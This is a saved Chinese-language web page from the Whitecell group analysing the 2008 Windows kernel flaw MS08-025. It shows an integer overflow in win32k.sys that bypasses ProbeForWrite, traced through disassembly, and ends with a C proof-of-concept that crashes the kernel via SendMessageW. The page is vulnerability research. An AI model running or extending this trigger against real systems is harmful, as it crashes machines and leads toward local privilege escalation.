From: <ÓÉ Windows Internet Explorer 7 ±£´æ>
Subject: =?gb2312?B?V2luZG93cyDE2rrLwqm2tCBtczA4MDI1ILfWzvY=?=
Date: Wed, 14 Apr 2010 23:28:14 +0800
MIME-Version: 1.0
Content-Type: text/html;
	charset="gb2312"
Content-Transfer-Encoding: quoted-printable
Content-Location: http://www.whitecell.org/list.php?id=55
X-MimeOLE: Produced By Microsoft MimeOLE V6.00.2900.5579

<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.0 Transitional//EN">
<HTML><HEAD><TITLE>Windows =C4=DA=BA=CB=C2=A9=B6=B4 ms08025 =
=B7=D6=CE=F6</TITLE>
<META http-equiv=3DContent-Type content=3D"text/html; charset=3Dgb2312">
<META content=3D"MSHTML 6.00.6000.17023" name=3DGENERATOR></HEAD>
<BODY><B><FONT size=3D2>Windows =C4=DA=BA=CB=C2=A9=B6=B4 ms08025 =
=B7=D6=CE=F6</B>=20
<BR><BR>Author:&nbsp;&nbsp;Polymorphours<BR>Email:&nbsp;&nbsp;&nbsp;Polym=
orphours@whitecell.org<BR>Homepage:http://www.whitecell.org=20
<BR>Date:&nbsp;&nbsp;&nbsp;&nbsp;2008-04-17<BR><BR>
<TABLE width=3D"100%" border=3D0>
  <TBODY>
  <TR>
    <TD><PRE>
=BE=AD=C4=DA=B2=BF=CC=D6=C2=DB=BA=F3=BE=F6=B6=A8=B9=AB=B2=BC=B7=D6=CE=F6=B3=
=C9=B9=FB=A1=A3

    =
4=D4=C28=BA=C5microsoft=D4=D9=B4=CE=B7=A2=B2=BC=C1=CB=D2=BB=B8=F6=CF=B5=CD=
=B3=C4=DA=BA=CB=B5=C4=B2=B9=B6=A1(KB941693),
=CE=A2=C8=ED=B6=D4=B8=C3=C2=A9=B6=B4=B5=C4=C3=E8=CA=F6=CE=AA: =
=B4=CB=B0=B2=C8=AB=B8=FC=D0=C2=BD=E2=BE=F6 Windows =
=C4=DA=BA=CB=D6=D0=D2=BB=B8=F6=C3=D8=C3=DC
=B1=A8=B8=E6=B5=C4=C2=A9=B6=B4=A1=A3 =
=B3=C9=B9=A6=C0=FB=D3=C3=B4=CB=C2=A9=B6=B4=B5=C4=B1=BE=B5=D8=B9=A5=BB=F7=D5=
=DF=BF=C9=D2=D4=CD=EA=C8=AB=BF=D8=D6=C6=CA=DC=D3=B0=CF=EC=B5=C4
=CF=B5=CD=B3=A1=A3 =
=B9=A5=BB=F7=D5=DF=BF=C9=CB=E6=BA=F3=B0=B2=D7=B0=B3=CC=D0=F2=A3=BB=B2=E9=BF=
=B4=A1=A2=B8=FC=B8=C4=BB=F2=C9=BE=B3=FD=CA=FD=BE=DD=A3=BB=BB=F2=D5=DF=B4=B4=
=BD=A8
=D0=C2=D5=CA=BB=A7=A1=A3=D5=E2=CA=C7=D3=C3=D3=DA Windows =
2000=A1=A2Windows XP=A1=A2Windows Server 2003=A1=A2
Windows Vista =BA=CD Windows Server 2008 =
=CB=F9=D3=D0=CA=DC=D6=A7=B3=D6=B0=E6=B1=BE=B5=C4=D6=D8=D2=AA=B0=B2=C8=AB
=B8=FC=D0=C2=A1=A3=B4=CB=B0=B2=C8=AB=B8=FC=D0=C2=CD=A8=B9=FD=D0=DE=B8=C4 =
Windows =
=C4=DA=BA=CB=D1=E9=D6=A4=B4=D3=D3=C3=BB=A7=C4=A3=CA=BD=B4=AB=B5=DD=B9=FD=C0=
=B4=B5=C4
=CA=E4=C8=EB=B5=C4=B7=BD=CA=BD=C0=B4=BD=E2=BE=F6=B4=CB=C2=A9=B6=B4=A1=A3

    =
=B4=D3=D5=E2=B8=F6=BD=E9=C9=DC=D6=D0=CE=D2=C3=C7=BF=B4=B5=BD=D5=E2=B8=F6=C2=
=A9=B6=B4=D3=B0=CF=EC=B7=C7=B3=A3=B9=E3=A3=AC=B4=D32000=B5=BD2008=A1=A3=CE=
=AA=C1=CB
=C4=DC=D2=BB=B6=C3=D5=E2=B8=F6=C2=A9=B6=B4=B5=C4=CF=B8=BD=DA=A3=AC=CE=D2=B7=
=D6=CE=F6=C1=CBms08-025=B5=C4=B2=B9=B6=A1=A3=AC=B7=A2=CF=D6=B8=C3=C2=A9=B6=
=B4=B4=E6=D4=DA=D3=DA=20
win32k.sys =
=C4=A3=BF=E9=D6=D0=A1=A3=D4=DA=D5=E2=B8=F6=B2=B9=B6=A1=D6=D0=D0=DE=B2=B9=C1=
=CBwin32k.sys=D6=D0=B5=C4=B6=E0=B8=F6=B5=D8=B7=BD=A3=AC=C6=E4
=D6=D0=B3=F6=CE=CA=CC=E2=B5=C4=B5=D8=B7=BD=B7=C7=B3=A3=D3=D0=C8=A4=A3=AC=CA=
=C7=D2=F2=CE=AA=D2=E7=B3=F6=BC=C4=B4=E6=C6=F7=C0=B4=C8=C6=B9=FD =
ProbeForWrite=20
=BA=AF=CA=FD=B6=D4=D3=C3=BB=A7=B2=E3=B4=AB=C0=B4=B5=C4=D6=B8=D5=EB=B5=C4=BC=
=EC=B2=E9=A3=AC=CF=C2=C3=E6=CE=D2=C3=C7=BE=CD=B4=D3 NtUserfnOUTSTRING=20
=BA=AF=CA=FD=D6=D0=B5=C4=CE=CA=CC=E2=C0=B4=D5=B9=BF=AA=CE=D2=C3=C7=B5=C4=B7=
=D6=CE=F6(=CE=D2=B7=D6=CE=F6=B5=C4=C6=BD=CC=A8=CA=C7winxp sp2)

.text:BF86FB04 ; int __stdcall NtUserfnOUTSTRING(int,int,int,PVOID =
Address,int,int,int)
.text:BF86FB04 __stdcall NtUserfnOUTSTRING(x, x, x, x, x, x, x) proc =
near
.text:BF86FB04                                         ; CODE XREF: =
xxxDefWindowProc(x,x,x,x)+6E=18p
.text:BF86FB04                                         ; =
NtUserMessageCall(x,x,x,x,x,x,x)+61=18p
.text:BF86FB04                                         ; =
xxxSendMessageToClient(x,x,x,x,x,x,x)-E=18p
.text:BF86FB04                                         ; =
xxxSendMessageToClient(x,x,x,x,x,x,x)+6D=18p
.text:BF86FB04                                         ; =
xxxWrapCallWindowProc(x,x,x,x,x)-4B=19p
.text:BF86FB04                                         ; =
xxxWrapCallWindowProc(x,x,x,x,x)+60=19p ...
.text:BF86FB04
.text:BF86FB04 var_24          =3D dword ptr -24h
.text:BF86FB04 var_20          =3D dword ptr -20h
.text:BF86FB04 UserBuffer      =3D dword ptr -1Ch
.text:BF86FB04 ms_exc          =3D CPPEH_RECORD ptr -18h
.text:BF86FB04 arg_0           =3D dword ptr  8
.text:BF86FB04 arg_4           =3D dword ptr  0Ch
.text:BF86FB04 arg_8           =3D dword ptr  10h
.text:BF86FB04 Address         =3D dword ptr  14h
.text:BF86FB04 arg_10          =3D dword ptr  18h
.text:BF86FB04 arg_14          =3D dword ptr  1Ch
.text:BF86FB04 arg_18          =3D dword ptr  20h
.text:BF86FB04
.text:BF86FB04 ; FUNCTION CHUNK AT .text:BF86FAE1 SIZE 0000001E BYTES
.text:BF86FB04
.text:BF86FB04                 push    14h
.text:BF86FB06                 push    offset unk_BF98D250
.text:BF86FB0B                 call    __SEH_prolog
.text:BF86FB0B
.text:BF86FB10                 xor     edx, edx
.text:BF86FB12                 mov     [ebp+ms_exc.disabled], edx
.text:BF86FB15                 mov     eax, [ebp+var_20]
.text:BF86FB18                 mov     ecx, 7FFFFFFFh
.text:BF86FB1D                 and     eax, ecx
.text:BF86FB1F                 mov     esi, [ebp+arg_18]
.text:BF86FB22                 shl     esi, 1Fh
.text:BF86FB25                 or      eax, esi
.text:BF86FB27                 mov     [ebp+var_20], eax
.text:BF86FB2A                 mov     esi, eax
.text:BF86FB2C                 xor     esi, [ebp+arg_8]  -&gt; esi =3D =
=BB=BA=B3=E5=C7=F8=B3=A4=B6=C8
.text:BF86FB2F                 and     esi, ecx
.text:BF86FB31                 xor     eax, esi
.text:BF86FB33                 mov     [ebp+var_20], eax
.text:BF86FB36                 cmp     [ebp+arg_18], edx  -&gt; =
=C8=E7=B9=FB=CA=C7 ansi =
=B7=BD=CA=BD=BE=CD=D6=B1=BD=D3=BD=F8=D0=D0=BC=EC=B2=E9=A3=AC=B7=F1=D4=F2=D0=
=E8=D2=AA=BC=C6=CB=E3unicode=B5=C4=B4=F3=D0=A1
.text:BF86FB39                 jnz     short loc_BF86FB47
.text:BF86FB39
.text:BF86FB3B                 lea     esi, [eax+eax]    &lt;- =
=D7=A2=D2=E2=D5=E2=C0=EF=A3=AC=CE=CA=CC=E2=BE=CD=D4=DA=D5=E2=C0=EF=A3=AC=B4=
=CB=CA=B1 eax =3D unicode=D7=D6=B7=FB=B4=AE=B5=C4=B3=A4=B6=C8=A3=AC
                                                        &lt;- =B5=B1 eax =
=3D 0x80000000 =B5=C4=CA=B1=BA=F2 eax + eax =3D =
0x100000000=A3=AC32=CE=BB=B5=C4=BC=C4=B4=E6=C6=F7
                                                        &lt;- =
=B1=BB=D2=E7=B3=F6=C1=CB=A3=ACesi =3D 0
.text:BF86FB3E                 xor     esi, eax
.text:BF86FB40                 and     esi, ecx
.text:BF86FB42                 xor     eax, esi
.text:BF86FB44                 mov     [ebp+var_20], eax -&gt; =
=B1=A3=B4=E6unicode=D5=BC=D3=C3=B5=C4=BF=D5=BC=E4=B4=F3=D0=A1
.text:BF86FB44
.text:BF86FB47
.text:BF86FB47 loc_BF86FB47:                           ; CODE XREF: =
NtUserfnOUTSTRING(x,x,x,x,x,x,x)+35=18j
.text:BF86FB47                 mov     [ebp+var_24], edx
.text:BF86FB4A                 mov     esi, [ebp+Address]
.text:BF86FB4D                 mov     [ebp+UserBuffer], esi
.text:BF86FB50                 xor     ebx, ebx
.text:BF86FB52                 inc     ebx
.text:BF86FB53                 push    ebx             ; Alignment
.text:BF86FB54                 and     eax, ecx
.text:BF86FB56                 push    eax             ; Length &lt;- =
=D3=C9=D3=DA eax =3D 0=A3=AC=CB=F9=D2=D4ProbeForWrite=B1=BB=C8=C6=B9=FD
.text:BF86FB57                 push    esi             ; Address
.text:BF86FB58                 call    ds:ProbeForWrite(x,x,x)


bf80a1b0 e96ef4ffff       jmp   win32k!xxxRealDefWindowProc+0x1235 =
(bf809623)
bf80a1b5 d1e8             shr     eax,1
bf80a1b7 894510           mov     [ebp+0x10],eax
bf80a1ba ebf1             jmp    win32k!xxxRealDefWindowProc+0x190 =
(bf80a1ad)
bf80a1bc 8b4514           mov     eax,[ebp+0x14]
bf80a1bf f6400780         test    byte ptr [eax+0x7],0x80
bf80a1c3 8b4008           mov     eax,[eax+0x8]
bf80a1c6 7408             jz     win32k!xxxRealDefWindowProc+0x105 =
(bf80a1d0)
bf80a1c8 c60000           mov     byte ptr [eax],0x0
bf80a1cb e951f4ffff       jmp   win32k!xxxRealDefWindowProc+0x1225 =
(bf809621)
bf80a1d0 668910           mov     [eax],dx    &lt;- =
=D4=DA=D5=E2=C0=EF=A3=AC=B6=D4=C7=B0=C3=E6=B4=AB=C8=EB=B5=C4=D6=B8=D5=EB=BD=
=F8=D0=D0=C1=CB2=B8=F6=D7=D6=BD=DA=B5=C4=D0=B4=B2=D9=D7=F7=A3=AC=D0=B4=C8=
=EB=B5=C4=CA=FD=BE=DD=CE=AA0
bf80a1d3 e949f4ffff       jmp   win32k!xxxRealDefWindowProc+0x1225 =
(bf809621)
bf80a1d8 6a00             push    0x0
bf80a1da 6a02             push    0x2
bf80a1dc ff7638           push    dword ptr [esi+0x38]
bf80a1df e8d1690200       call    win32k!BuildHwndList (bf830bb5)
bf80a1e4 8bf8             mov     edi,eax
bf80a1e6 85ff             test    edi,edi
bf80a1e8 0f8433f4ffff     je    win32k!xxxRealDefWindowProc+0x1225 =
(bf809621)
bf80a1ee 8d7710           lea     esi,[edi+0x10]


=C4=C7=C3=B4=D4=F5=C3=B4=B4=A5=B7=A2=D5=E2=B8=F6=C2=A9=B6=B4=C4=D8=A3=AC=CE=
=D2=D3=D6=B7=D6=CE=F6=C1=CB user32.dll =BA=CD =
win32k!NtUserMessageCall=A3=AC
=B7=A2=CF=D6=B4=A5=B7=A2=D5=E2=B8=F6=C2=A9=B6=B4=BA=DC=BC=F2=B5=A5=A3=AC=D6=
=BB=D0=E8=D2=AA=B5=F7=D3=C3 SendMessageW =B7=A2=CB=CDWM_GETTEXT =
=CF=FB=CF=A2=BE=CD=C4=DC=B9=BB=B4=A5=B7=A2=C1=CB=A3=AC
=CF=C2=C3=E6=CA=C7poc=B4=FA=C2=EB(=D7=A2=A3=AC=B8=C4=B4=FA=C2=EB=D4=CB=D0=
=D0=BA=F3=D3=C9=D3=DA=D4=DA=C4=DA=BA=CB=D0=B4=C1=CB=CE=B4=D3=B3=C9=E4=B5=C4=
=C4=DA=B4=E6=A3=AC=BB=E1=D6=B1=BD=D3=C0=B6=C6=C1=A3=AC=D2=AA=B8=C4=B3=C9=BF=
=C9
=D3=C3=B5=C4exploit=A3=AC=BF=C9=D2=D4=B2=CE=BF=BC=CE=D2=D2=D4=C7=B0=B5=C4=
exploit)

#include <STDIO.H>
#include <WINDOWS.H>

int main(int argc,char *argv[])
{
    DWORD    dwHookAddress =3D 0x80000000;

    printf( "\tMS08-025 Local Privilege Escalation Vulnerability =
Exploit(POC)\n\n" );
        printf( "Create by Whitecell's Polymorphours@whitecell.org =
2008/04/10\n" );

    SendMessageW( GetDesktopWindow(), WM_GETTEXT, 0x80000000, =
dwHookAddress );
    return 0;
}

</PRE></TD></TR></TBODY></TABLE><BR><BR>WSS(Whitecell Security=20
Systems)=A3=AC=D2=BB=B8=F6=B7=C7=D3=AA=C0=FB=D0=D4=C3=F1=BC=E4=BC=BC=CA=F5=
=D7=E9=D6=AF=A3=AC=D6=C2=C1=A6=D3=DA=B8=F7=D6=D6=CF=B5=CD=B3=B0=B2=C8=AB=BC=
=BC=CA=F5=B5=C4=D1=D0=BE=BF=A1=A3=BC=E1=B3=D6=B4=AB=CD=B3=B5=C4hacker=BE=AB=
=C9=F1=A3=AC=D7=B7=C7=F3=BC=BC=CA=F5=B5=C4=BE=AB=B4=BF=A1=A3<BR>WSS=20
=D6=F7=D2=B3=A3=BAhttp://www.whitecell.org/ <BR>WSS =
=C2=DB=CC=B3=A3=BAhttp://www.whitecell.org/forums/=20
</FONT></BODY></HTML>
